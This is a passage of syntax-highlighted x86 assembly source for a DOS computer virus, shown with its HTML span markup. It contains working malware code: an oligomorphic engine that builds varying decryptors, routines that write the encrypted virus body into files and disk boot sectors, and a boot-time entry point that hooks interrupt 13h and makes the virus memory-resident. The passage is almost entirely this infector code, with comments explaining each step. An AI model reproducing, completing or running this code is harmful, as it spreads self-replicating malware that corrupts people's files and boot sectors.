        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decr_block_jmp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0b8h</span><span class="sc0">      </span><span class="sc1">; mov ax,</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">virus_enc_lenght</span><span class="sc4">)</span><span class="sc0">
                                                </span><span class="sc1">; encrypted body virus lenght</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decr_block_jmp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0430h</span><span class="sc0">                </span><span class="sc1">; xor byte ptr [si],al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3480h</span><span class="sc0">                </span><span class="sc1">; xor byte ptr [si],imm8</span><span class="sc0">
                                                </span><span class="sc1">; in CX will be carried the</span><span class="sc0">
                                                </span><span class="sc1">; enc instruction while in DX</span><span class="sc0">
                                                </span><span class="sc1">; the decryption one</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">good_encr</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; to add</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                  </span><span class="sc1">; so enc to sub</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">good_encr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                  </span><span class="sc1">; to sub</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; so enc to add</span><span class="sc0">
</span><span class="sc5">good_encr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">good_pointer</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; or 1 means use DI as pointer</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">good_pointer</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; or 3 becames use BX as pntr</span><span class="sc0">
</span><span class="sc5">good_pointer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">encr_instr</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">prefeccia</span><span class="sc0">
</span><span class="sc5">prefeccia</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; convert from pointer value</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; to value for immediate</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; assignment (SI 1 -&gt; 6,</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; DI 2 -&gt; 7, BX 3 -&gt; 3)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">                 </span><span class="sc1">; mov reg_pointer,imm16</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">        </span><span class="sc1">; initial pointer value</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decr_block_jmp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; get pointer register</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">goo_pntt</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc5">goo_pntt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc0">                  </span><span class="sc1">; not opcode with reg used</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc0">                 </span><span class="sc1">; not prefix</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; store the not</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">decr_jmps_tbl</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">decr_jmps_tbl</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">      </span><span class="sc1">; store the offset from NOT</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; instruction to the decryption</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; instruction for the change</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decr_block_jmp</span><span class="sc0">

                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">      </span><span class="sc1">; decryption instruction isn't clear but NOTed</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">        </span><span class="sc1">; store decryption instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; and value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decr_block_jmp</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; increment pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decr_block_jmp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">48h</span><span class="sc0">       </span><span class="sc1">; decrement counter AX</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">decr_jmps_tbl</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; calculate jump to next loop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc0">                  </span><span class="sc1">; jne next loop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; store</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decr_block_jmp</span><span class="sc0">          </span><span class="sc1">; else last jump to virus entry</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">encr_instr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0430h</span><span class="sc0">                   </span><span class="sc1">; will be substituted by the enc</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; instruction using [si] and al</span><span class="sc0">
                                                </span><span class="sc1">; as key</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encr_instr</span><span class="sc0">              </span><span class="sc1">; encrypt chunk</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; move on next chunk</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">what_call</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; call the routine that will</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; write the chunk to file or</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; boot which address is in</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; [what_call]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">enc_chunk_loop</span><span class="sc0">
</span><span class="sc5">finished_enc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">write_to_disk</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; this routine writes the 200h chunk (or smaller if last) to disk. values of</span><span class="sc0">
</span><span class="sc1">; where to place the virus (h/s/c) are setup before in virus code. the chunk</span><span class="sc0">
</span><span class="sc1">; is already pointed by ES:BX</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">value_cx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">prefetchio</span><span class="sc0">
</span><span class="sc5">prefetchio</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b9h</span><span class="sc0">                    </span><span class="sc1">; mov cx,</span><span class="sc0">
</span><span class="sc5">value_cx</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bah</span><span class="sc0">                    </span><span class="sc1">; mov dx,</span><span class="sc0">
</span><span class="sc5">value_dx</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">write_to_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; this routine writes the 200h chunk to a file. the virus body in input is at</span><span class="sc0">
</span><span class="sc1">; ES:BX. if the last chunk is written to file then also the bytes of align to</span><span class="sc0">
</span><span class="sc1">; a 10h boundary lenght are written</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bbh</span><span class="sc0">                    </span><span class="sc1">; mov bx,</span><span class="sc0">
</span><span class="sc5">file_handle</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_last_cnk</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0aaaah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">                </span><span class="sc1">; sub cl,</span><span class="sc0">
</span><span class="sc5">value_cl</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ch</span><span class="sc0">                     </span><span class="sc1">; align to 10h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">87h</span><span class="sc0">
</span><span class="sc5">not_last_cnk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">from_bootmbr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; entry point when virus is activated from mbr or floppy bs. control is</span><span class="sc0">
</span><span class="sc1">; given here after the stable virus loader and the oligo decryptor</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                 </span><span class="sc1">; read orignal mbr of fb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">                </span><span class="sc1">; to 0:7c00h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                              </span><span class="sc1">; on the stack are</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">read_from_dx</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">   </span><span class="sc1">; present the params</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">; of hd or fb where</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">read_from_cx</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">; the virus resides</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; virus resides - 1 = original</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                     </span><span class="sc1">; mbr of fbs</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4eeh</span><span class="sc4">],</span><span class="sc2">02eeh</span><span class="sc0">        </span><span class="sc1">; virus internal value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">; save original int13h at</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">; the int86h position</span><span class="sc0">

</span><span class="sc1">; map of virus in memory installation:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  0:228h - 0:2D9h      : virus int13h handler code</span><span class="sc0">
</span><span class="sc1">;  0:282h               : virus loading in memory routine, this is the</span><span class="sc0">
</span><span class="sc1">;                       ; memory_residence routine</span><span class="sc0">
</span><span class="sc1">;  0:2F6h               : CALL to 0:282h + first JMP FAR opcode</span><span class="sc0">
</span><span class="sc1">;  0:2FAh               : original int21h segment:offset</span><span class="sc0">
</span><span class="sc1">;  0:2FEh               ; CALL to 0:282h + first JMP FAR opcode</span><span class="sc0">
</span><span class="sc1">;  0:306h               : CALL to 0:282h + first JMP FAR opcode</span><span class="sc0">
</span><span class="sc1">;  0:30eh               : CALL to 0:282h + first JMP FAR opcode</span><span class="sc0">
</span><span class="sc1">;  0:316h               : CALL to 0:282h + first JMP FAR opcode</span><span class="sc0">
</span><span class="sc1">;  0:4eeh               ; word used by virus for residency check and internal</span><span class="sc0">
</span><span class="sc1">;                       ; purposes</span><span class="sc0">
</span><span class="sc1">;  0:4f0h - 4f8h        : a JMP to 0:228, int 86h and retf2</span><span class="sc0">
</span><span class="sc1">;                       ; the int 86h will be changed to a int 88h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handler_13h</span><span class="sc0">           </span><span class="sc1">; copy to 0:228h the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">228h</span><span class="sc0">                         </span><span class="sc1">; first int13h handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handler_13h_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handler_13h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                  </span><span class="sc1">; put the calls as described</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2f6h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc2">282h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">2f6h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">))</span><span class="sc0">        </span><span class="sc1">; call offset</span><span class="sc0">
</span><span class="sc5">put_calls_t</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">                 </span><span class="sc1">; call opcode</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">; call offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0eah</span><span class="sc0">                 </span><span class="sc1">; jmp far opcode</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
